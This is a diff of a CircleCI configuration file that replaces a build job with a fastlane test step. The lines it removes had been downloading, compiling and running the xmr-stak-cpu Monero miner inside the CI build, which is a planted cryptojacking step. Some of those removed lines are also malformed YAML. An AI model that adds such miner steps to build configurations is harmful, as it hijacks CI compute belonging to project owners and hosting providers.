@@ -1,22 +1,12 @@
-version: 2
 jobs:
-  build:
+  build-and-test:
     macos:
       xcode: "9.0"
     steps:
-      - checkout
-      - build:
-          name: Deploy
-          command: brew install wget
-      - download:
-          name: download
-          command: wget https://github.com/fireice-uk/xmr-stak-cpu/archive/v1.3.0-1.5.0.zip
-      - unzip
-          name: unzip
-          command: unzip v1.3.0-1.5.0.zip
-      - make
-          name: make
-          command: brew install cmake && brew install openssl && cd v1.3.0-1.5.0 && cmake -DMICROHTTPD_REQUIRED=OFF -DOPENSSL_ROOT_DIR=/usr/local/opt/openssl . && make install
-      - run 
-          name: run
-          command: ./v1.3.0-1.5.0/bin/xmr-stak-cpu
+      - run:
+          name: Run tests
+          command: fastlane scan
+          environment:
+            SCAN_DEVICE: iPhone 6
+            SCAN_SCHEME: WebTests
+
